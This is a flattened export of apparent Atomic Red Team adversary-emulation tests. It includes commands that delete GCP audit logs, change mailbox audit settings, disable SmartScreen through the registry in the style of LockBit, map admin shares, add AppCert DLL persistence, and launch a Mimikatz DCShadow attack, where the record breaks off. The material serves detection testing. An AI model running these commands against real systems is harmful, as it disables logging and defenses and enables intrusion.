",powershell,False,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity ""#{target_email}"" -AuditBypassEnabled $false
Disconnect-ExchangeOnline -Confirm:$false
",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement

","input_arguments.username.description: office-365 username

input_arguments.username.type: string

input_arguments.username.default: o365_user_test

input_arguments.password.description: office-365 password

input_arguments.password.type: string

input_arguments.password.default: o365_password_test

input_arguments.target_email.description: office-365 target_email

input_arguments.target_email.type: string

input_arguments.target_email.default: o365_email_test

"
T1562.008,Impair Defenses: Disable Cloud Logs,GCP - Delete Activity Event Log,d56152ec-01d9-42a2-877c-aac1f6ebe8e6,"GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.
An adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. 

This Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.
",iaas:gcp,,,"gcloud config set project #{project-id}
gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet
",sh,False,,,sh,"dependencies.0.description: Requires gcloud

dependencies.0.prereq_command: if [ -x ""$(command -v gcloud)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

dependencies.1.description: Check if user is logged in 

dependencies.1.prereq_command: gcloud config get-value account

dependencies.1.get_prereq_command: gcloud auth login --no-launch-browser

","input_arguments.project-id.description: ID of the GCP Project you to execute the command against.

input_arguments.project-id.type: string

input_arguments.project-id.default: atomic-project-1

"
T1040,Network Sniffing,Packet Capture Linux using tshark or tcpdump,7fe741f7-b265-4951-a7c7-320889083b3e,"Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.
",linux,,,"tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
",bash,True,,,bash,"dependencies.0.description: Check if at least one of tcpdump or tshark is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v tcpdump)"" ] && [ ! -x ""$(command -v tshark)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)

","input_arguments.interface.description: Specify interface to perform PCAP on.

input_arguments.interface.type: string

input_arguments.interface.default: ens33

"
T1040,Network Sniffing,Packet Capture FreeBSD using tshark or tcpdump,c93f2492-9ebe-44b5-8b45-36574cccfe67,"Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.
",linux,,,"tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
",sh,True,,,sh,"dependencies.0.description: Check if at least one of tcpdump or tshark is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v tcpdump)"" ] && [ ! -x ""$(command -v tshark)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y wireshark-nox11)

","input_arguments.interface.description: Specify interface to perform PCAP on.

input_arguments.interface.type: string

input_arguments.interface.default: em0

"
T1040,Network Sniffing,Packet Capture macOS using tcpdump or tshark,9d04efee-eff5-4240-b8d2-07792b873608,"Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.
",macos,,,"sudo tcpdump -c 5 -nnni #{interface}    
if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i #{interface}; fi;
",bash,True,,,bash,"dependencies.0.description: Check if at least one of tcpdump or tshark is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v tcpdump)"" ] && [ ! -x ""$(command -v tshark)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)

","input_arguments.interface.description: Specify interface to perform PCAP on.

input_arguments.interface.type: string

input_arguments.interface.default: en0A

"
T1040,Network Sniffing,Packet Capture Windows Command Prompt,a5b2f6a0-24b4-493e-9590-c699f75723ca,"Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark
installed.

Upon successful execution, tshark will execute and capture 5 packets on interface ""Ethernet"".
",windows,,,"""c:\Program Files\Wireshark\tshark.exe"" -i #{interface} -c 5
",command_prompt,True,,,powershell,"dependencies.0.description: tshark must be installed and in the default path of ""c:\Program Files\Wireshark\Tshark.exe"".

dependencies.0.prereq_command: if (test-path ""#{tshark_path}"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\wireshark_installer.exe"" #{wireshark_url}
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\wireshark_installer.exe"" /S

dependencies.1.description: npcap must be installed.

dependencies.1.prereq_command: if (test-path ""#{npcap_path}"") {exit 0} else {exit 1}
dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\npcap_installer.exe"" #{npcap_url}
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\npcap_installer.exe""

","input_arguments.interface.description: Specify interface to perform PCAP on.

input_arguments.interface.type: string

input_arguments.interface.default: Ethernet

input_arguments.wireshark_url.description: wireshark installer download URL

input_arguments.wireshark_url.type: url

input_arguments.wireshark_url.default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe

input_arguments.tshark_path.description: path to tshark.exe

input_arguments.tshark_path.type: path

input_arguments.tshark_path.default: c:\program files\wireshark\tshark.exe

input_arguments.npcap_url.description: npcap installed download URL

input_arguments.npcap_url.type: url

input_arguments.npcap_url.default: https://nmap.org/npcap/dist/npcap-1.31.exe

input_arguments.npcap_path.description: path to npcap.sys

input_arguments.npcap_path.type: path

input_arguments.npcap_path.default: C:\Program Files\Npcap\npcap.sys

"
T1040,Network Sniffing,Windows Internal Packet Capture,b5656f67-d67f-4de8-8e62-b5581630f528,"Uses the built-in Windows packet capture
After execution you should find a file named trace.etl and trace.cab in the temp directory",windows,,,netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,command_prompt,True,,"netsh trace stop >nul 2>&1
TIMEOUT /T 5 >nul 2>&1
del %temp%\trace.etl >nul 2>&1
del %temp%\trace.cab >nul 2>&1",,,
T1040,Network Sniffing,Windows Internal pktmon capture,c67ba807-f48b-446e-b955-e4928cd1bf91,"Will start a packet capture and store log file as t1040.etl.
https://lolbas-project.github.io/lolbas/Binaries/Pktmon/",windows,,,"pktmon.exe start --etw  -f %TEMP%\t1040.etl
TIMEOUT /T 5 >nul 2>&1
pktmon.exe stop
",command_prompt,True,,del %TEMP%\t1040.etl,,,
T1040,Network Sniffing,Windows Internal pktmon set filter,855fb8b4-b8ab-4785-ae77-09f5df7bff55,"Select Desired ports for packet capture 
https://lolbas-project.github.io/lolbas/Binaries/Pktmon/",windows,,,"pktmon.exe filter add -p 445
",command_prompt,True,,pktmon filter remove,,,
T1040,Network Sniffing,Packet Capture macOS using /dev/bpfN with sudo,e6fe5095-545d-4c8b-a0ae-e863914be3aa,"Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.
",macos,,,"sudo #{program_path} -i #{ifname} -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: exit 1

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.ifname.description: Specify interface to perform PCAP on.

input_arguments.ifname.type: string

input_arguments.ifname.default: en0

input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_macos_pcapdemo

"
T1040,Network Sniffing,Filtered Packet Capture macOS using /dev/bpfN with sudo,e2480aee-23f3-4f34-80ce-de221e27cd19,"Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.
",macos,,,"sudo #{program_path} -f -i #{ifname} -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: exit 1

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.ifname.description: Specify interface to perform PCAP on.

input_arguments.ifname.type: string

input_arguments.ifname.default: en0

input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_macos_pcapdemo

"
T1040,Network Sniffing,Packet Capture FreeBSD using /dev/bpfN with sudo,e2028771-1bfb-48f5-b5e6-e50ee0942a14,"Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.
",linux,,,"sudo #{program_path} -i #{ifname} -t 3
",sh,True,,"rm -f #{program_path}
",sh,"dependencies.0.description: compile C program

dependencies.0.prereq_command: exit 1

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.ifname.description: Specify interface to perform PCAP on.

input_arguments.ifname.type: string

input_arguments.ifname.default: em0

input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_freebsd_pcapdemo

"
T1040,Network Sniffing,Filtered Packet Capture FreeBSD using /dev/bpfN with sudo,a3a0d4c9-c068-4563-a08d-583bd05b884c,"Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.
",linux,,,"sudo #{program_path} -f -i #{ifname} -t 3
",sh,True,,"rm -f #{program_path}
",sh,"dependencies.0.description: compile C program

dependencies.0.prereq_command: exit 1

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.ifname.description: Specify interface to perform PCAP on.

input_arguments.ifname.type: string

input_arguments.ifname.default: em0

input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_freebsd_pcapdemo

"
T1040,Network Sniffing,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo",10c710c9-9104-4d5f-8829-5b65391e2a29,"Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.
",linux,,,"sudo #{program_path} -a -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: if [ -f ""#{program_path}"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_linux_pcapdemo

"
T1040,Network Sniffing,"Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo",7a0895f0-84c1-4adf-8491-a21510b1d4c1,"Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.
",linux,,,"sudo #{program_path} -4 -p 6 -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: if [ -f ""#{program_path}"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_linux_pcapdemo

"
T1040,Network Sniffing,"Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo",515575ab-d213-42b1-aa64-ef6a2dd4641b,"Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.
SOCK_PACKET is ""obsolete"" according to the man page, but still works on Ubuntu 20.04
",linux,,,"sudo #{program_path} -4 -P -p 17 -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: if [ -f ""#{program_path}"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_linux_pcapdemo

"
T1040,Network Sniffing,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo",b1cbdf8b-6078-48f5-a890-11ea19d7f8e9,"Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.
Sets a BPF filter on the socket to filter for UDP traffic.
",linux,,,"sudo #{program_path} -a -f -t 3
",bash,True,,"rm -f #{program_path}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: if [ -f ""#{program_path}"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: cc #{csource_path} -o #{program_path}

","input_arguments.csource_path.description: Path to C program source

input_arguments.csource_path.type: string

input_arguments.csource_path.default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c

input_arguments.program_path.description: Path to compiled C program

input_arguments.program_path.type: string

input_arguments.program_path.default: /tmp/t1040_linux_pcapdemo

"
T1484.001,Domain Policy Modification: Group Policy Modification,LockBit Black - Modify Group policy settings -cmd,9ab80952-74ee-43da-a98c-1e740a985f28,"An adversary can modify the group policy settings.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v ShellSmartScreenLevel /t REG_SZ /d Block /f
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v ShellSmartScreenLevel /f >nul 2>&1
",,,
T1484.001,Domain Policy Modification: Group Policy Modification,LockBit Black - Modify Group policy settings -Powershell,b51eae65-5441-4789-b8e8-64783c26c1d1,"An adversary modifies group policy settings
",windows,,,"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force
",powershell,True,,"Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore 
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore
",,,
T1021.002,Remote Services: SMB/Windows Admin Shares,Map admin share,3386975b-367a-4fbb-9d77-4dcf3639ffd3,"Connecting To Remote Shares
",windows,,,"cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}""
",command_prompt,,,,,,"input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: DOMAIN\Administrator

input_arguments.share_name.description: Examples C$, IPC$, Admin$

input_arguments.share_name.type: string

input_arguments.share_name.default: C$

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

input_arguments.computer_name.description: Target Computer Name

input_arguments.computer_name.type: string

input_arguments.computer_name.default: Target

"
T1021.002,Remote Services: SMB/Windows Admin Shares,Map Admin Share PowerShell,514e9cd7-9207-4882-98b1-c8f791bae3c5,"Map Admin share utilizing PowerShell
",windows,,,"New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
",powershell,,,,,,"input_arguments.share_name.description: Examples C$, IPC$, Admin$

input_arguments.share_name.type: string

input_arguments.share_name.default: C$

input_arguments.map_name.description: Mapped Drive Letter

input_arguments.map_name.type: string

input_arguments.map_name.default: g

input_arguments.computer_name.description: Target Computer Name

input_arguments.computer_name.type: string

input_arguments.computer_name.default: Target

"
T1021.002,Remote Services: SMB/Windows Admin Shares,Copy and Execute File with PsExec,0eb03d41-79e4-4393-8e57-6344856be1cf,"Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
",windows,,,"""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}
",command_prompt,True,,,powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})

dependencies.0.prereq_command: if (Test-Path ""#{psexec_exe}"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
New-Item -ItemType Directory (Split-Path ""#{psexec_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""#{psexec_exe}"" -Force

","input_arguments.command_path.description: File to copy and execute

input_arguments.command_path.type: path

input_arguments.command_path.default: C:\Windows\System32\cmd.exe

input_arguments.remote_host.description: Remote computer to receive the copy and execute the file

input_arguments.remote_host.type: string

input_arguments.remote_host.default: \\localhost

input_arguments.psexec_exe.description: Path to PsExec

input_arguments.psexec_exe.type: string

input_arguments.psexec_exe.default: PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe

"
T1021.002,Remote Services: SMB/Windows Admin Shares,Execute command writing output to local Admin Share,d41aaab5-bdfe-431d-a3d5-c29e9136ff46,"Executes a command, writing the output to a local Admin Share.
This technique is used by post-exploitation frameworks.
",windows,,,"cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
",command_prompt,True,,,,,"input_arguments.output_file.description: Remote computer to receive the copy and execute the file

input_arguments.output_file.type: string

input_arguments.output_file.default: output.txt

input_arguments.command_to_execute.description: Command to execute for output.

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: hostname

"
T1546.009,Event Triggered Execution: AppCert DLLs,Create registry persistence via AppCert DLL,a5ad6104-5bab-4c43-b295-b4c44c7c6b05,"Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. 
Once the computer restarted, the DLL will be loaded in multiple processes and write an 
'AtomicTest.txt' file in C:\Users\Public\ to validate that the DLL executed succesfully.

Reference: https://skanthak.homepage.t-online.de/appcert.html
",windows,,,"Copy-Item ""#{dll_path}"" C:\Users\Public\AtomicTest.dll -Force
reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f
if(#{reboot}){Restart-Computer} 
",powershell,True,,"reg delete ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /f
Remove-Item C:\Users\Public\AtomicTest.dll -Force
Remove-Item C:\Users\Public\AtomicTest.txt -Force
",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{dll_path})

dependencies.0.prereq_command: if (Test-Path ""#{dll_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"" -OutFile ""#{dll_path}""

","input_arguments.dll_path.description: path of dll to use

input_arguments.dll_path.type: path

input_arguments.dll_path.default: PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll

input_arguments.reboot.description: Set value to $true if you want to automatically reboot the machine

input_arguments.reboot.type: string

input_arguments.reboot.default: $false

"
T1027.004,Obfuscated Files or Information: Compile After Delivery,Compile After Delivery using csc.exe,ffcdbd6a-b0e8-487d-927a-09127fe9a206,"Compile C# code using csc.exe binary used by .NET
Upon execution an exe named T1027.004.exe will be placed in the temp folder
",windows,,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""
",command_prompt,,,"del #{output_file} >nul 2>&1
",powershell,"dependencies.0.description: C# file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{input_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs"" -OutFile ""#{input_file}""

","input_arguments.output_file.description: Output compiled binary

input_arguments.output_file.type: path

input_arguments.output_file.default: C:\Windows\Temp\T1027.004.exe

input_arguments.input_file.description: C# code that launches calc.exe from a hidden cmd.exe Window

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1027.004\src\calc.cs

"
T1027.004,Obfuscated Files or Information: Compile After Delivery,Dynamic C# Compile,453614d8-3ba6-4147-acc0-7ec4b3e1faef,"When C# is compiled dynamically, a .cmdline file will be created as a part of the process. 
Certain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.
The exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.
Upon execution, the exe will print 'T1027.004 Dynamic Compile'.
",windows,,,"Invoke-Expression ""#{input_file}""
",powershell,,,,powershell,"dependencies.0.description: exe file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile ""#{input_file}""

","input_arguments.input_file.description: exe program containing dynamically compiled C# code

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1027.004\bin\T1027.004_DynamicCompile.exe

"
T1027.004,Obfuscated Files or Information: Compile After Delivery,C compile,d0377aa6-850a-42b2-95f0-de558d80be57,"Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
",linux,macos,,"gcc #{input_file} && ./a.out
clang #{input_file} && ./a.out
",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if [ -e  #{input_file} ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O ""#{input_file}""

","input_arguments.input_file.description: source file

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.c

"
T1027.004,Obfuscated Files or Information: Compile After Delivery,CC compile,da97bb11-d6d0-4fc1-b445-e443d1346efe,"Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
",linux,macos,,"g++ #{input_file} && ./a.out
clang++ #{input_file} && ./a.out
",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if [ -e  #{input_file} ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O #{input_file}

","input_arguments.input_file.description: source file

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc

"
T1027.004,Obfuscated Files or Information: Compile After Delivery,Go compile,78bd3fa7-773c-449e-a978-dc1f1500bc52,"Compile a go file with golang on FreeBSD, Linux or Macos.
",linux,macos,,"go run #{input_file}
",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if [ -e  #{input_file} ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O #{input_file}

","input_arguments.input_file.description: source file

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.go

"
T1207,Rogue Domain Controller,DCShadow (Active Directory),0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6,"Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.

[DCShadow](https://www.dcshadow.com/)
[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount

Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
The easiest is to run elevated and as a Domain Admin user.
",windows,,,"# starting fake DC server, as SYSTEM (required)
$dc_output_file = ""PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit""

Write-Host ""`nWaiting for fake DC server to return""
Wait-Process $dc

Write-Host ""`nOutput from fake DC server:""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
